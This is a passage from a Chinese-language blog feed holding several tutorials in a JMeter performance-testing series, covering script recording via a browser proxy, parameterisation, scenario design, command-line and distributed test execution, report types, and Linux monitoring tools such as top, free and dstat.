<a class="article-sort-item-img" href="/p/7bc6027.html" target="_blank">【Performance】06.
性能测试技术磨合篇之脚本执行和结果分析</a>
<a class="article-sort-item-img" href="/p/f25d7b6e.html" target="_blank">【Performance】07.
性能测试技术历练篇之性能监控工具</a>
<a class="article-sort-item-img" href="/p/683c1dd9.html" target="_blank">【Performance】08.
性能测试技术历练篇之性能分析神器 JProfile</a>
<a class="article-sort-item-img" href="/p/bf4fa918.html" target="_blank">【Performance】09.
性能测试技术历练篇之 Java 诊断工具 Arthas</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>Jmeter</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】05 - 性能测试技术磨合篇之脚本录制和调试</title>
    <url>/p/5914cf6e.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  在完成测试场景的设计、确定场景所涉及的业务流程范围之后，就可以开始针对该测试场景，编写性能测试脚本了。不同的测试场景，其业务流程的复杂程度也不尽相同。当某个测试场景包含上百个网络请求时，通过人工编写的方式，显然会增加更多的时间成本，编写过程中也极易出错。
  针对如此庞大的业务请求量的测试场景，可利用 JMeter 非测试元件中的 <code>HTTP(S) Test Script Recorder</code> 元件，以脚本录制的方式，快速而又便捷的将其全部 “收入囊中”。</p>
<hr>
<h1 id="脚本录制">2. 脚本录制</h1>
<h2 id="测试脚本录制器添加">2.1. 测试脚本录制器添加</h2>
<p>  启动 JMeter，在配置元件的 <code>Non Test Elements</code> 中，选择 <code>HTTP(S) Test Script Recorder</code> 元件，将其添加到 <code>Test Plan</code> 下面。</p>
<figure>
<img src="/p/5914cf6e/添加脚本录制器配置元件.webp" alt="添加脚本录制器配置元件">
<figcaption aria-hidden="true">添加脚本录制器配置元件</figcaption>
</figure>
<h2 id="脚本录制器监听网络请求">2.2. 脚本录制器监听网络请求</h2>
<p>  实现脚本录制器监听网络请求的方式有多种，如：修改系统级的网络代理、修改浏览器的网络代理等。由于修改系统级的网络代理，会导致系统所有的网络请求都会被 JMeter 监听并录制到脚本中，因此，我们使用修改浏览器网络代理的方式，使脚本录制器仅监听浏览器中制定 IP 和端口的网络请求。</p>
<ol type="1">
<li><p>浏览器添加代理插件</p>
<ul>
<li>Chrome/Edge 等浏览器可通过插件市场在线安装或下载安装，例如 <a href="https://microsoftedge.microsoft.com/addons/detail/proxy-switchyomega/fdbloeknjpnloaggplaobopplkdhnikc"><code>Proxy SwitchyOmega</code></a>插件。打开插件设置后，新建一个情景模式，配置信息可参考如下。保存后，点击右上角的插件图标，单机选择刚才新建的的情景模式即可启用。</li>
<li>Firefox 浏览器的高级选项中包含网络代理设置，设置内容大同小异，各参数参考如下。</li>
</ul>
<figure>
<img src="/p/5914cf6e/SwitchyOmega插件配置示例.webp" alt="SwitchyOmega插件配置示例">
<figcaption aria-hidden="true">SwitchyOmega 插件配置示例</figcaption>
</figure></li>
<li><p>脚本录制器配置</p>
<ul>
<li>脚本录制器中的配置主要包含端口号和主机名，需要与上一步代理插件配置中的参数保持一致，否则无法中正确监听到浏览器中的网络请求。</li>
</ul>
<figure>
<img src="/p/5914cf6e/脚本录制器配置.webp" alt="脚本录制器配置">
<figcaption aria-hidden="true">脚本录制器配置</figcaption>
</figure>
<ul>
<li>在绝大多数性能测试场景中，静态资源请求由于不参与后台服务器的逻辑处理，一般是不在测试范围内的。因此，在脚本录制的过程中，可以将静态资源过滤掉，过滤的方法在脚本录制器的 <code>Requests Filtering</code> 中进行配置，如下图所示，过滤的表达式可参考如下。</li>
</ul>
<figure>
<img src="/p/5914cf6e/Requests_Filtering配置.webp" alt="Requests Filtering配置">
<figcaption aria-hidden="true">Requests Filtering 配置 </figcaption>
</figure>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">(?i).*\.(bmp|css|js|gif|ico|jpe?g|png|swf|woff|woff2)</span><br><span class="line">.*\.js.*|.*\.css.*|.*\.html.*|.*\.jpg.*|.*\.ttf.*|.*\.png.*</span><br><span class="line">.*\.otf.*|.*\.cab.*|.*\.woff.*|.*\.woff2.*|.*\.swf.*|</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="手动执行业务流程">2.3. 手动执行业务流程</h2>
<ol type="1">
<li><p>完成以上配置后，即可开始录制业务流程场景的性能测试脚本了。首先，根据被测业务场景的流程，将其划分为若干个事务（一个事务对应用户操作一次浏览器的过程），并选择一个事务控制器，添加在左侧的元件树列表中。以某购物平台的查询订单物流信息为例，可大致分为如下几个事务：登录、点击我的订单、查询未完成订单、点击物流信息、退出登录等。</p>
<blockquote>
<p>由于针对一个用户（线程）而言，登录和退出登录仅需操作一次，其他事务才是该场景中真正需要被测试的，所以登录和退出登录这两个事务控制器无需放置在循环控制器中。loadRunner 中，一般会将这两个事务分别放置在 <code>vuser_init</code> 和 <code>vuser_end</code> 中，中间的事务放置在 <code>action</code> 中。</p>
</blockquote>
<figure>
<img src="/p/5914cf6e/事务划分和添加.webp" alt="事务划分和添加">
<figcaption aria-hidden="true">事务划分和添加</figcaption>
</figure></li>
<li><p>切换到脚本录制器中，点击 <code>Target Controller</code> 下拉框，可看到上一步咱们添加的事务控制器列表，此项需要在业务流程操作的过程中同步选择。选择的原则是，下一步准备操作哪一个事务，就选择哪一个事务控制器。</p>
<figure>
<img src="/p/5914cf6e/目标控制器选择.webp" alt="目标控制器选择">
<figcaption aria-hidden="true">目标控制器选择</figcaption>
</figure></li>
<li><p>在脚本录制器元件中点击 <code>Start</code> 按钮，监听启动正常后，会弹出一个用户录制控制的浮框，打开浏览器，访问被测项目的地址，依次操作并录制各个事务动作后，点击浮框中的 <code>Stop</code> 按钮，即可停止监听和录制，此时，该业务流程场景对应的测试脚本就已录制完成，可在左侧的元件树中查看。</p>
<blockquote>
<p>注意：每一个的页面操作，需要等待页面完全加载完毕后，方可切换到下一个事务控制器，否则 A 事务中的网络请求将会被录制到 B 事务控制器中。</p>
</blockquote>
<figure>
<img src="/p/5914cf6e/业务流程录制后的脚本示例.webp" alt="业务流程录制后的脚本示例">
<figcaption aria-hidden="true">业务流程录制后的脚本示例</figcaption>
</figure></li>
</ol>
<hr>
<h1 id="脚本调试">3. 脚本调试</h1>
<p>  到此为止，咱们已经完成了脚本录制的工作，接下来，则是到了性能测试工作中至关重要、也是最繁杂的脚本调试阶段，性能测试脚本的维护工作也主要集中于此。</p>
<h2 id="脚本调试的内容">3.1. 脚本调试的内容</h2>
<ol type="1">
<li>将业务流程中的测试数据修改为由外部文件提供的方式，使其可被用户统一修改和维护，如：商品名称、商品数量、登录用户信息等。</li>
<li>寻找业务流程中存在上下文关联关系的数据，将其修改为上下文引用变量的形式。如：登录成功后的会话 token、订单提交后的订单 ID 等。</li>
<li>验证脚本的可行性和正确性，运行过程中不允许出现接口不通（由于性能压测导致接口超时除外）、数据数据文件读取失败等错误。</li>
</ol>
<h2 id="脚本调试过程">3.2. 脚本调试过程</h2>
<ol type="1">
<li><p>按接口请求顺序，依次查看各事务中各个请求的 cookies、入参信息，确认是否有动态变化的参数。</p></li>
<li><p>如果有存在上下文关联关系的参数，向上分析最早返回这个参数值的请求，添加一个后置处理器，如<code>正则表达式提取器</code>、<code>CSS选择提取器</code>、<code>JSON提取器</code>均可，用来解析获取请求返回报文中的参数值。</p></li>
<li><p>在 XX 提取器中定义好变量名称，正确填写提取表达式、匹配维度、默认值等信息。</p>
<figure>
<img src="/p/5914cf6e/正则表达式提取器提取sessionID.webp" alt="正则表达式提取器提取sessionID">
<figcaption aria-hidden="true">正则表达式提取器提取 sessionID</figcaption>
</figure></li>
<li><p> 使用全局替换的形式，将相同参数值替换成变量名称，变量格式为：<code>${VarName}</code>。</p>
<figure>
<img src="/p/5914cf6e/数据替换及变量引用.webp" alt="数据替换及变量引用">
<figcaption aria-hidden="true">数据替换及变量引用</figcaption>
</figure></li>
<li><p>如果有由用户输入的参数，则在<code>线程组</code>之前添加一个 <code>CSV Data Set Config</code> 等配置元件，配置参考如下，然后以全局替换的形式，依次将原来的数据替换成对应的变量名称即可。</p>
<blockquote>
<p>Filename：数据文件名，建议填写相对路径，并将文件放置在 JMeter 主目录下</p>
<p>File
encoding：文件编码，根据数据文件确定，建议设置为 <code>UTF-8</code></p>
<p>Variable
Names：变量名，与数据文件中的数值相对应。如果有多个，用英文逗号分割</p>
<p>Ingore first line：是否忽略第一行，根据数据文件中的第一行内容确定</p>
<p>Delimiter：分隔符，根据数据文件中的内容分隔符确定，建议选择与数据无关的字符</p>
<p>Allow quoted data：是否允许数据带引号，根据实际的数据文件内容确定</p>
<p>Recycle on
EOF：文件内容遍历结束后是否重新开始遍历，根据实际文件内容和业务场景确定</p>
<p>Stop thread on
EOF：文件内容遍历结束后是否停止线程，根据实际文件内容和业务场景确定</p>
<p>Sharing mode：数据共享模式，实际文件内容和业务场景确定</p>
</blockquote></li>
<li><p>最后，添加一个 <code>View Result Tree</code> 元件，用来查看运行时是否出现错误。当调试完成后，所有的网络请求和数据提取都没有报错（显示为绿色）时，则可以表明该测试脚本运行正常，可用于后续的正式性能测试。</p></li>
</ol>
<hr>
<blockquote>
<p>性能测试工具 JMeter 合集
<a class="article-sort-item-img" href="/p/8a2bea76.html" target="_blank">【Performance】01.
性能测试技术初探篇之性能测试介绍</a>
<a class="article-sort-item-img" href="/p/616bf269.html" target="_blank">【Performance】02.
性能测试技术初探篇之常用性能测试工具</a>
<a class="article-sort-item-img" href="/p/22fcd8bb.html" target="_blank">【Performance】03.
性能测试技术初探篇之 JMeter 工具使用</a>
<a class="article-sort-item-img" href="/p/3177ee85.html" target="_blank">【Performance】04.
性能测试技术磨合篇之性能测试场景设计</a>
<a class="article-sort-item-img" href="/p/5914cf6e.html" target="_blank">【Performance】05.
性能测试技术磨合篇之脚本录制和调试</a>
<a class="article-sort-item-img" href="/p/7bc6027.html" target="_blank">【Performance】06.
性能测试技术磨合篇之脚本执行和结果分析</a>
<a class="article-sort-item-img" href="/p/f25d7b6e.html" target="_blank">【Performance】07.
性能测试技术历练篇之性能监控工具</a>
<a class="article-sort-item-img" href="/p/683c1dd9.html" target="_blank">【Performance】08.
性能测试技术历练篇之性能分析神器 JProfile</a>
<a class="article-sort-item-img" href="/p/bf4fa918.html" target="_blank">【Performance】09.
性能测试技术历练篇之 Java 诊断工具 Arthas</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>脚本录制</tag>
        <tag>脚本调试</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】04. 性能测试技术磨合篇之性能测试场景设计</title>
    <url>/p/3177ee85.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  性能测试场景设计是执行性能测试的基础，如同功能测试一样，需要先制定测试计划、确定测试范围、测试方法、测试目标、测试介入 / 退出条件等内容，不至于在执行测试的过程中一头雾水，这样的测试工作才会更有价值。</p>
<hr>
<h1 id="场景设计">2. 场景设计</h1>
<p>  性能测试的场景设计，最直接的参考来源就是项目的技术方案或需求规格说明书，文档中列出了用户对于该项目的性能指标需求，咱们可以简单划分成以下三种场景类型。</p>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 18%">
<col style="width: 73%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th>场景分类</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td> 单业务场景</td>
<td>用户登录、文件上传 / 下载接口等</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 2</td>
<td> 综合业务场景</td>
<td>用户登录 + 用户开户 + 用户销户 + 用户移机 + 用户改套餐等</td>
</tr>
<tr class="odd">
<td style="text-align: center;"> 3</td>
<td> 稳定性场景</td>
<td> 7*24 小时不间断运行等</td>
</tr>
</tbody>
</table>
<h2 id="单业务场景">2.1. 单业务场景</h2>
<p>  以文件上传接口场景为例，某项目的该性能需求描述如下：
&gt; 支持同时 100 个用户同时上传不大于 10M 的文本、图像以及 pdf 文件</p>
<h2 id="综合业务场景">2.2. 综合业务场景</h2>
<p>  综合业务场景的设计并不是简单地将单业务场景合并在一起，它还需要考虑综合业务场景的总并发数、分配给每个业务的并发数、并发用户数的启动策略、综合场景的运行时长等因素，这些因素的不同，会对性能测试的结果产生不同的影响。
  这些场景因子的配置策略，主要是参考用户真实环境，然后进行适当的调整，测试出来的结果也才会更加接近于真实环境。
  例：某购物平台的某时间断内各业务请求的日常在线用户和促销日在线用户占比如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th>业务名称</th>
<th style="text-align: center;">日常在线用户占比</th>
<th style="text-align: center;">促销日在线用户占比</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td> 商品查询</td>
<td style="text-align: center;"> 36%</td>
<td style="text-align: center;">40%</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td> 商品加购</td>
<td style="text-align: center;"> 20%</td>
<td style="text-align: center;">24%</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td> 订单提交</td>
<td style="text-align: center;"> 16%</td>
<td style="text-align: center;">18%</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td> 订单付款</td>
<td style="text-align: center;"> 12%</td>
<td style="text-align: center;">12%</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5</td>
<td> 订单查询</td>
<td style="text-align: center;"> 12%</td>
<td style="text-align: center;">4.5%</td>
</tr>
<tr class="even">
<td style="text-align: center;">6</td>
<td> 用户信息更新</td>
<td style="text-align: center;"> 1%</td>
<td style="text-align: center;">0.5%</td>
</tr>
<tr class="odd">
<td style="text-align: center;">7</td>
<td> 商品退换货</td>
<td style="text-align: center;"> 3%</td>
<td style="text-align: center;">1%</td>
</tr>
</tbody>
</table>
<ul>
<li> 并发用户数</li>
</ul>
<p>  JMeter 线程组配置元件中，<code>并发用户数（Number of Threads）</code>属性用来控制 JMeter 模拟多少个线程来执行测试，一个线程代表一个用户，当确定好总的并发用户数时，就可以参考在线用户占比，为单个业务场景进行分配并发用户数了。</p>
<ul>
<li>线程启动时间</li>
</ul>
<p>  JMeter 线程组配置元件中，<code>启动时间（Ramp-up preriod）</code>属性用来指定 JMeter 花费多长时间来初始化这些线程，当启动时间配置太小时，会使得 JMeter 在启动测试的短时间内初始化比较多的线程数，可能使得还未执行到业务场景时，服务器就已经达到饱和状态；当启动时间配置太大时，就可能存在最后一个线程组还未启动的情况下，第一个线程就已经完成测试了，这类测试结果并没有满足并发用户数的要求。
  一般地，线程启动时间合理的规则就是：使线程启动过程时的点击率接近平均点击率，例：平均点击率为 10 次 / 秒，指定的线程数是 200，那么比较合理的线程启动时间就是：<span class="math inline">\(\frac{100}{10} = 20\)</span>。</p>
<ul>
<li>运行时长</li>
</ul>
<p>  JMeter 线程组配置元件中，<code>运行时长（Duration）</code>属性用来指示 JMeter 为线程组配置一个定时器，当线程组运行满足指定的时长后，中断所有线程，测试停止。
  运行时长的配置不宜太短，否则样本空间不够丰富，导致测试结果不准确；同时也不能够太长（压力测试除外），随着时间的推移，当样本空间达到一定级别后，测试结果可能会趋于稳定，此后的样本数据结果不会对最终测试结果产生较大的影响。</p>
<hr>
<h1 id="总结">3. 总结</h1>
<p>  以上只是性能测试场景设计中的冰山一角，还有线程的循环控制配置、启动延迟配置、逻辑控制器的循环控制配置等等，需要结合实际性能测试点和真实环境进行分析，通过合理且巧妙地配置各项参数，来满足测试场景的要求。
  总而言之，无论是单业务场景，还是综合业务场景性能测试的场景设计，都不是单纯的编写脚本、组合脚本，更多的是要从用户的角度出发，场景符合用户的行为习惯，以此来模拟更真实的运行环境。</p>
<hr>
<blockquote>
<p>性能测试工具 JMeter 合集
<a class="article-sort-item-img" href="/p/8a2bea76.html" target="_blank">【Performance】01.
性能测试技术初探篇之性能测试介绍</a>
<a class="article-sort-item-img" href="/p/616bf269.html" target="_blank">【Performance】02.
性能测试技术初探篇之常用性能测试工具</a>
<a class="article-sort-item-img" href="/p/22fcd8bb.html" target="_blank">【Performance】03.
性能测试技术初探篇之 JMeter 工具使用</a>
<a class="article-sort-item-img" href="/p/3177ee85.html" target="_blank">【Performance】04.
性能测试技术磨合篇之性能测试场景设计</a>
<a class="article-sort-item-img" href="/p/5914cf6e.html" target="_blank">【Performance】05.
性能测试技术磨合篇之脚本录制和调试</a>
<a class="article-sort-item-img" href="/p/7bc6027.html" target="_blank">【Performance】06.
性能测试技术磨合篇之脚本执行和结果分析</a>
<a class="article-sort-item-img" href="/p/f25d7b6e.html" target="_blank">【Performance】07.
性能测试技术历练篇之性能监控工具</a>
<a class="article-sort-item-img" href="/p/683c1dd9.html" target="_blank">【Performance】08.
性能测试技术历练篇之性能分析神器 JProfile</a>
<a class="article-sort-item-img" href="/p/bf4fa918.html" target="_blank">【Performance】09.
性能测试技术历练篇之 Java 诊断工具 Arthas</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>测试场景设计</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】06. 性能测试技术磨合篇之脚本执行和结果分析</title>
    <url>/p/7bc6027.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>在完成性能测试脚本的调试工作之后，就可以进入正式的性能测试脚本执行阶段了。JMeter 脚本执行应使用 CLI 命令行的形式，同时应该禁用不需要的配置元件，避免 GUI 页面和部分配置元件影响性能测试结果。
<code>jmeter -n -t [jmx file] -l [results file] -j [log file] -e -o [Path to web report folder]</code>
<img src="/p/7bc6027/JMeter启动提示.webp" alt="JMeter启动提示"></p>
<p>JMeter 的命令格式以及常用的参数如下表所示，更多参数及含义可通过 <code>jmeter -?</code> 命令查看。</p>
<table style="width:100%;">
<colgroup>
<col style="width: 4%">
<col style="width: 66%">
<col style="width: 29%">
</colgroup>
<thead>
<tr class="header">
<th>参数名</th>
<th>含义</th>
<th>参数值示例</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-n</code></td>
<td>以非 GUI 的形式启动运行</td>
<td> /</td>
</tr>
<tr class="even">
<td><code>-t</code></td>
<td>指定负载测试脚本的 jmx 文件路径</td>
<td> D:.jmx</td>
</tr>
<tr class="odd">
<td><code>-l</code></td>
<td>指定负载测试脚本运行结果的 jtl 文件路径</td>
<td> D:.jtl</td>
</tr>
<tr class="even">
<td><code>-j</code></td>
<td>指定 JMeter 运行日志的 log 文件路径</td>
<td> D:.log</td>
</tr>
<tr class="odd">
<td><code>-e</code></td>
<td>表明负载测试结束后生成 HTML 报告</td>
<td> /</td>
</tr>
<tr class="even">
<td><code>-o</code></td>
<td>指定负载测试脚本运行生成的 HTML 报告文件夹路径，路径下非空时会报错，或加 <code>-f</code> 参数强制清空</td>
<td> D:\</td>
</tr>
<tr class="odd">
<td><code>-s</code></td>
<td>表明 JMeter 以服务节点的方式启动</td>
<td> /</td>
</tr>
<tr class="even">
<td><code>-r</code></td>
<td>表明 JMeter 以远程调用的方式启动，远程节点在 <code>jmeter.properties</code> 中配置</td>
<td> remote_hosts=192.168.0.112,192.168.0.113</td>
</tr>
<tr class="odd">
<td><code>-R</code></td>
<td>表明 JMeter 以远程调用的方式启动，并调用以下指定的远程节点，会覆盖 <code>jmeter.properties</code> 中的配置</td>
<td> 192.168.0.112,192.168.0.113</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="脚本执行">2. 脚本执行</h1>
<p>JMeter 支持本地和远程调用两种启动方式。</p>
<h2 id="本地执行">2.1. 本地执行</h2>
<p>JMeter 本地执行，只需打开命令行终端，按照入戏个事输入命令后回车，JMeter 即可开始根据 jmx 脚本执行性能测试，执行完成后自动退出，并在指定的路径下生成对应的结果文件和 HTML 报告。
<code>jmeter -n -t [jmx file] -l [results file] -j [log file] -e -o [Path to web report folder]</code></p>
<h2 id="远程调用执行">2.2. 远程调用执行</h2>
<ol type="1">
<li>从 JMeter
4.0 版本开始，默认的 RMI 传输机制会使用 SSL，这需要密钥和证书才能够正常的工作。因此，在以远程调用的方式启动 JMeter 之前，需通过 <code>create-rmi-keystore</code> 脚本，生成 jks 文件，并拷贝到所有客户节点和服务节点的 JMeter 程序 bin 目录下。
<img src="/p/7bc6027/create_rmi_keystore脚本生成jks文件.webp" alt="JMeter启动提示"></li>
<li>各服务端的 JMeter 使用如下命令，以服务节点的形式启动。
<code>jmeter-server</code> 或 <code>jmeter -s</code></li>
<li>客户端的 JMeter 使用如下命令启动，即可调用指定的远程服务节点执行负载测试。
<code>jmeter -n -t C:\Users\boyce\PlanDemo.jmx -l C:\Users\boyce\result\res.jtl -e -o C:\Users\boyce\result\WebReport\ -R 192.168.0.112</code></li>
</ol>
<h1 id="报告生成与分析">3. 报告生成与分析</h1>
<p>JMeter 中自带多种报告，如：图表结果、聚合报表、总结报表、响应时间图等。除此之外，还可以集成第三方报告生成的插件，使报告更加完善全面。</p>
<h2 id="summaryreport">3.1. SummaryReport</h2>
<p>在 Summary
Report 组件导入测试结果 jtl 文件后，展示的总结报表如下。通过以 Label 字段排序，可得知每一个事务的样本量、平均耗时、最小耗时、最大耗时、耗时标准偏差、错误率、吞吐量、接收速率、发送速率以及平均字节大小。</p>
<h2 id="aggregatereport">3.2. AggregateReport</h2>
<p>在 Aggregate
Report 组件导入测试结果 jtl 文件后，展示的总结报表如下。通过以 Label 字段排序，可得知每一个事务的样本量、平均耗时、中位数耗时、90% 耗时、95% 耗时、99% 耗时、最小耗时、最大耗时、错误率、吞吐量、接收速率以及发送速率。</p>
<h2 id="aggregate-graph">3.3. Aggregate Graph</h2>
<p>聚合图形报告主要将聚合报告以图形化的形式进行展示，可自定义选择待展示的列标题、事务标签等内容。
在 Aggregate
Graph 组件导入测试结果 jtl 文件后，指定展示平均耗时、90% 耗时、最大耗时字段，并仅保留父级事务标签后，生成的聚合图形报告如下。</p>
<h2 id="response-time-graph">3.4. Response Time Graph</h2>
<p>响应时间图，主要统计并展示测试周期内各个事务的响应时间变化曲线。
在 Response Time
Graph 组件导入测试结果 jtl 文件，筛选保留父级事务标签后，生成的响应时间图如下。</p>
<h2 id="view-result-in-table">3.5. View Result in Table</h2>
<p>以表格查看结果组件按照时间流水的形式，依次展示每一个采样器的采样结果，包含采样耗时、采样状态、接收数据量、发送数据量、延时、连接耗时等信息。</p>
<hr>
<blockquote>
<p>性能测试工具 JMeter 合集
<a class="article-sort-item-img" href="/p/8a2bea76.html" target="_blank">【Performance】01.
性能测试技术初探篇之性能测试介绍</a>
<a class="article-sort-item-img" href="/p/616bf269.html" target="_blank">【Performance】02.
性能测试技术初探篇之常用性能测试工具</a>
<a class="article-sort-item-img" href="/p/22fcd8bb.html" target="_blank">【Performance】03.
性能测试技术初探篇之 JMeter 工具使用</a>
<a class="article-sort-item-img" href="/p/3177ee85.html" target="_blank">【Performance】04.
性能测试技术磨合篇之性能测试场景设计</a>
<a class="article-sort-item-img" href="/p/5914cf6e.html" target="_blank">【Performance】05.
性能测试技术磨合篇之脚本录制和调试</a>
<a class="article-sort-item-img" href="/p/7bc6027.html" target="_blank">【Performance】06.
性能测试技术磨合篇之脚本执行和结果分析</a>
<a class="article-sort-item-img" href="/p/f25d7b6e.html" target="_blank">【Performance】07.
性能测试技术历练篇之性能监控工具</a>
<a class="article-sort-item-img" href="/p/683c1dd9.html" target="_blank">【Performance】08.
性能测试技术历练篇之性能分析神器 JProfile</a>
<a class="article-sort-item-img" href="/p/bf4fa918.html" target="_blank">【Performance】09.
性能测试技术历练篇之 Java 诊断工具 Arthas</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Performance</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>脚本执行</tag>
        <tag>结果分析</tag>
      </tags>
  </entry>
  <entry>
    <title>【Performance】07. 性能测试技术历练篇之性能监控工具</title>
    <url>/p/f25d7b6e.html</url>
    <content><![CDATA[<h1 id="linux自带监控工具">1. Linux 自带监控工具</h1>
<h2 id="top工具">1.1. top 工具</h2>
<p>top 是 Linux 和类 Unix 系统中比较常用的系统状态监控工具。他通过动态刷新的交互式视图，直观地展示系统总体信息和各个进程的运行状态信息。在 Linux 终端直接输入 <code>top</code> 命令，即可进入 top 工具状态监控页面。</p>
<ul>
<li>系统总体信息中每行的含义为：系统运行时间和平均负载、系统当前的进程运行统计、总体 CPU 或各核心的使用情况、物理内存使用情况、交换空间使用情况。</li>
<li>进程运行状态信息中每列的含义为：进程标识符、进程所属用户、进程优先级、进程优先级调整值、虚拟内存占用量、物理内存占用量、共享内存占用量、内存占用率、进程累计运行时间、进程运行命令。</li>
</ul>
<figure>
<img src="/p/f25d7b6e/image-20240111214922497.webp" alt="image-20240111214922497">
<figcaption aria-hidden="true">image-20240111214922497</figcaption>
</figure>
<p>在系统监控页面中，通过输入不同的参数，可实现交互式的调整监控视图。</p>
<ol type="1">
<li><p>按 <code>u</code> 键，可通过指定用户名，筛选属于该用户的进程状态信息。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111215212898.webp" alt="image-20240111215212898">
<figcaption aria-hidden="true">image-20240111215212898</figcaption>
</figure></li>
<li><p> 按 <code>f</code> 键，可进行调整视图，自定义视图展示的字段、排序字段。通过上下方向键选择，按<code>空格</code>键切换该字段的展示，按 <code>s</code> 键确定排序的字段。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111215333185.webp" alt="image-20240111215333185">
<figcaption aria-hidden="true">image-20240111215333185</figcaption>
</figure></li>
<li><p> 按数字 <code>1</code> 键，可在 CPU 总体状态和各核心状态之间切换展示。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111215550851.webp" alt="image-20240111215550851">
<figcaption aria-hidden="true">image-20240111215550851</figcaption>
</figure></li>
<li><p> 按 <code>e</code> 键，可切换内存相关字段的展示单位，切换顺序为：<strong>Byte-&gt;KB-&gt;MB-&gt;GB-&gt;TB-&gt;PB</strong>。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111215638553.webp" alt="image-20240111215638553">
<figcaption aria-hidden="true">image-20240111215638553</figcaption>
</figure></li>
</ol>
<h2 id="free工具">1.2. free 工具</h2>
<p>free 工具用于 Linux 系统中显示系统物理内存使用状态。在 Linux 终端直接输入 <code>free</code> 命令，即可打印一次系统当前时刻的内存和交换空间使用状态。</p>
<p>打印的内容中，每列的含义分别为：系统总屋里内存量、占用物理内存量、空闲物理内存量、共享物理内存量、buffer 和 cache 占用的内存量、可被进程使用的物理内存量。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111220359993.webp" alt="image-20240111220359993">
<figcaption aria-hidden="true">image-20240111220359993</figcaption>
</figure>
<p><code>free</code> 命令也支持携带参数进行使用，例如：</p>
<ol type="1">
<li><p>若要切换内存展示的单位，可使用参数 <code>-b</code>、<code>-k</code>、<code>-m</code>、<code>-g</code>、<code>-tera</code>、<code>peta</code>，分别以 <code>Byte</code>、<code>KB</code>、<code>MB</code>、<code>GB</code>、<code>TB</code>、<code>PB</code> 为单位进行展示（数值会向下取整）。使用参数 <code>-h</code>，系统则会根据数值的大小自动选择合适的单位进行展示。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111220444881.webp" alt="image-20240111220444881">
<figcaption aria-hidden="true">image-20240111220444881</figcaption>
</figure></li>
<li><p> 若要实时监控并打印内存使用状态，可使用参数 <code>-s N</code>，系统将每间隔 N 秒打印一次内存信息，直至使用 <code>ctrl+c</code> 组合键结束。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111220528335.webp" alt="image-20240111220528335">
<figcaption aria-hidden="true">image-20240111220528335</figcaption>
</figure></li>
<li><p> 若要制定打印次数，可使用参数 <code>-c N</code>，系统将打印 N 次内存信息后自动结束（未结合 <code>-s</code> 参数使用时，默认间隔 1 秒）。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111220607087.webp" alt="image-20240111220607087">
<figcaption aria-hidden="true">image-20240111220607087</figcaption>
</figure></li>
</ol>
<hr>
<h1 id="第三方性能监控工具">2. 第三方性能监控工具</h1>
<h2 id="dstat工具">2.1. dstat 工具</h2>
<p>dstat 工具类似于 top 工具，自动刷新并打印系统 CPU、磁盘、内存、交换空间、网络等状态信息。</p>
<p>在 Linux 终端通过 <code>apt install dstat</code> 或 <code>yum install dstat</code> 命令安装后，直接输入 <code>dstat</code> 命令，即可实时刷新并打印系统当前使用状态信息。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111221827598.webp" alt="image-20240111221827598">
<figcaption aria-hidden="true">image-20240111221827598</figcaption>
</figure>
<p><code>dstat</code> 命令未指定参数时，默认使用 <code>-a 1</code> 为参数，即一秒打印一次系统所有的状态信息；同时也支持携带参数进行使用。如：</p>
<ol type="1">
<li><p>通过分别使用参数 <code>-c</code>、<code>-d</code>、<code>-m</code>、<code>-n</code>、<code>-g</code>、<code>-y</code>，依次单独监控 <code>CPU</code>、<code>磁盘</code>、<code>网络</code>、<code>内存</code>、<code>交换空间</code>、<code>分页</code>、<code>系统</code>等状态信息。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111221949783.webp" alt="image-20240111221949783">
<figcaption aria-hidden="true">image-20240111221949783</figcaption>
</figure></li>
<li><p> 使用参数 <code>--tcp</code>，实时监控 TCP 网络连接状态信息，包含监听数量、活动数量、握手数量、等待关闭数量、已关闭数量等内容。</p>
<figure>
<img src="/p/f25d7b6e/image-20240111222025350.webp" alt="image-20240111222025350">
<figcaption aria-hidden="true">image-20240111222025350</figcaption>
</figure></li>
<li><p> 使用参数 <code>--socket</code>，实时监控 socket 套接字状态信息，包含连接总数量、tcp 套接字数量、udp 套接字数量、raw 原始套接字数量、frg 套接字数量等内容。</p>
<figure>
